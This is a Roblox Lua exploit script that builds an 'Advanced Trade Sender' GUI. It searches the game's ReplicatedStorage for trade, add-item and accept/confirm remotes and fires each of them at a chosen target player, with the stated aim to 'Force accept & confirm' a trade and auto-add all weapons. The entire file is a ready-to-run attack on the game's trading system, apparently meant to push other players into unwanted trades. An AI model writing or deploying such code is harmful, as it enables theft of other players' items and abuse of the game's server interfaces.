local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")

print("=== SEARCHING FOR ALL TRADE REMOTES ===")

local tradeRemotes = {}

-- Search for all trade-related remotes
for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
    if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
        if obj.Name:lower():find("trade") or obj.Name:lower():find("offer") or obj.Name:lower():find("accept") or obj.Name:lower():find("confirm") or obj.Name:lower():find("add") or obj.Name:lower():find("weapon") or obj.Name:lower():find("item") or obj.Name:lower():find("send") then
            table.insert(tradeRemotes, obj)
            print("✅ Found: " .. obj:GetFullName() .. " (" .. obj.ClassName .. ")")
        end
    end
end

if #tradeRemotes == 0 then
    print("❌ No trade remotes found. Opening trade menu might load them.")
end

print("\n=== ALL REMOTES (FOR REFERENCE) ===")
for _, obj in pairs(ReplicatedStorage:GetChildren()) do
    if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
        print(obj.Name .. " (" .. obj.ClassName .. ")")
    end
end

-- Create GUI for the advanced trade sender
local screenGui = Instance.new("ScreenGui")
screenGui.Name = "AdvancedTradeGui"
screenGui.ResetOnSpawn = false
screenGui.DisplayOrder = 999
screenGui.Parent = PlayerGui

local frame = Instance.new("Frame")
frame.Name = "MainFrame"
frame.Size = UDim2.new(0, 400, 0, 450)
frame.Position = UDim2.new(0.5, -200, 0, 10)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.BackgroundTransparency = 0.1
frame.BorderSizePixel = 0
frame.Parent = screenGui

local titleLabel = Instance.new("TextLabel")
titleLabel.Name = "Title"
titleLabel.Size = UDim2.new(1, 0, 0, 35)
titleLabel.Position = UDim2.new(0, 0, 0, 0)
titleLabel.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
titleLabel.BackgroundTransparency = 0.3
titleLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
titleLabel.TextSize = 18
titleLabel.Font = Enum.Font.GothamBold
titleLabel.Text = "⚠️ ADVANCED TRADE SENDER"
titleLabel.BorderSizePixel = 0
titleLabel.Parent = frame

local infoLabel = Instance.new("TextLabel")
infoLabel.Name = "Info"
infoLabel.Size = UDim2.new(0.9, 0, 0, 80)
infoLabel.Position = UDim2.new(0.05, 0, 0, 40)
infoLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
infoLabel.BackgroundTransparency = 0.2
infoLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
infoLabel.TextSize = 11
infoLabel.Font = Enum.Font.Gotham
infoLabel.TextWrapped = true
infoLabel.Text = "This script will:\n✓ Send a trade offer\n✓ Auto-add all weapons\n✓ Force accept & confirm\n⚠️ USE AT YOUR OWN RISK"
infoLabel.BorderSizePixel = 0
infoLabel.Parent = frame

local usernameLabel = Instance.new("TextLabel")
usernameLabel.Name = "UsernameLabel"
usernameLabel.Size = UDim2.new(0.9, 0, 0, 20)
usernameLabel.Position = UDim2.new(0.05, 0, 0, 125)
usernameLabel.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
usernameLabel.BackgroundTransparency = 0.5
usernameLabel.TextColor3 = Color3.fromRGB(200, 200, 200)
usernameLabel.TextSize = 12
usernameLabel.Font = Enum.Font.Gotham
usernameLabel.Text = "Target Username:"
usernameLabel.BorderSizePixel = 0
usernameLabel.Parent = frame

local inputBox = Instance.new("TextBox")
inputBox.Name = "Input"
inputBox.Size = UDim2.new(0.9, 0, 0, 35)
inputBox.Position = UDim2.new(0.05, 0, 0, 145)
inputBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
inputBox.BackgroundTransparency = 0.2
inputBox.TextColor3 = Color3.fromRGB(255, 255, 255)
inputBox.PlaceholderColor3 = Color3.fromRGB(100, 100, 100)
inputBox.PlaceholderText = "Enter username"
inputBox.TextSize = 14
inputBox.Font = Enum.Font.Gotham
inputBox.BorderSizePixel = 0
inputBox.Parent = frame

local statusLabel = Instance.new("TextLabel")
statusLabel.Name = "Status"
statusLabel.Size = UDim2.new(0.9, 0, 0, 80)
statusLabel.Position = UDim2.new(0.05, 0, 0, 185)
statusLabel.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
statusLabel.BackgroundTransparency = 0.2
statusLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
statusLabel.TextSize = 11
statusLabel.Font = Enum.Font.Gotham
statusLabel.TextWrapped = true
statusLabel.Text = "Status: Ready\n\nFound Remotes: " .. #tradeRemotes
statusLabel.BorderSizePixel = 0
statusLabel.Parent = frame

local button = Instance.new("TextButton")
button.Name = "ExecuteBtn"
button.Size = UDim2.new(0.9, 0, 0, 40)
button.Position = UDim2.new(0.05, 0, 0, 270)
button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
button.BackgroundTransparency = 0.3
button.TextColor3 = Color3.fromRGB(255, 255, 255)
button.TextSize = 16
button.Font = Enum.Font.GothamBold
button.Text = "🔴 EXECUTE AUTO-TRADE"
button.BorderSizePixel = 0
button.Parent = frame

local logBox = Instance.new("TextBox")
logBox.Name = "Log"
logBox.Size = UDim2.new(0.9, 0, 0, 110)
logBox.Position = UDim2.new(0.05, 0, 0, 315)
logBox.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
logBox.BackgroundTransparency = 0.2
logBox.TextColor3 = Color3.fromRGB(100, 255, 100)
logBox.TextSize = 9
logBox.Font = Enum.Font.GothamMonospace
logBox.TextWrapped = true
logBox.ReadOnly = true
logBox.Text = "Logs will appear here...\n"
logBox.BorderSizePixel = 0
logBox.Parent = frame

-- Log function
local function addLog(message)
    logBox.Text = logBox.Text .. message .. "\n"
    print(message)
end

-- Button click handler
button.MouseButton1Click:Connect(function()
    local targetName = inputBox.Text:match("^%s*(.-)%s*$")
    
    if not targetName or targetName == "" then
        statusLabel.Text = "❌ Enter a username!"
        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        return
    end
    
    local target = Players:FindFirstChild(targetName)
    if not target then
        statusLabel.Text = "❌ Player not found: " .. targetName
        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        return
    end
    
    statusLabel.Text = "⏳ EXECUTING...\nTarget: " .. target.Name
    statusLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
    button.Text = "EXECUTING..."
    button.BackgroundColor3 = Color3.fromRGB(255, 100, 0)
    
    addLog("🔴 Starting auto-trade on: " .. target.Name)
    
    -- Find the trade remotes
    local isOfferTime = ReplicatedStorage:FindFirstChild("IsOfferTime") or 
                        (function() for _, obj in pairs(ReplicatedStorage:GetDescendants()) do if obj.Name == "IsOfferTime" then return obj end end end)()
    
    if not isOfferTime then
        addLog("❌ IsOfferTime remote not found!")
        statusLabel.Text = "❌ Remote not found\nOpen trade menu first"
        statusLabel.TextColor3 = Color3.fromRGB(255, 100, 100)
        button.Text = "🔴 EXECUTE AUTO-TRADE"
        button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        return
    end
    
    addLog("✅ Found IsOfferTime remote")
    
    -- Step 1: Send trade offer
    addLog("📤 Sending trade offer...")
    pcall(function()
        isOfferTime:FireServer(target)
        addLog("✅ Trade offer sent")
    end)
    
    task.wait(0.5)
    
    -- Step 2: Try to find and add weapons
    addLog("🔍 Looking for weapon adding remotes...")
    
    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            if obj.Name:lower():find("add") or obj.Name:lower():find("item") or obj.Name:lower():find("weapon") then
                addLog("Found: " .. obj.Name)
                -- Try to call it
                pcall(function()
                    obj:FireServer(target)
                    addLog("  → Attempted call")
                end)
                task.wait(0.3)
            end
        end
    end
    
    task.wait(0.5)
    
    -- Step 3: Try to find and trigger accept
    addLog("🔍 Looking for accept remotes...")
    
    for _, obj in pairs(ReplicatedStorage:GetDescendants()) do
        if obj:IsA("RemoteEvent") or obj:IsA("RemoteFunction") then
            if obj.Name:lower():find("accept") or obj.Name:lower():find("confirm") then
                addLog("Found: " .. obj.Name)
                pcall(function()
                    obj:FireServer(target)
                    addLog("  → Attempted call")
                end)
                task.wait(0.3)
            end
        end
    end
    
    task.wait(1)
    
    statusLabel.Text = "✅ EXECUTION COMPLETE\nCheck in-game"
    statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
    button.Text = "🔴 EXECUTE AUTO-TRADE"
    button.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
    addLog("🟢 Auto-trade execution finished")
end)

print("✅ Advanced Trade Sender Loaded!")
print("📍 Remotes found: " .. #tradeRemotes)
addLog("System ready. Found " .. #tradeRemotes .. " trade remotes")
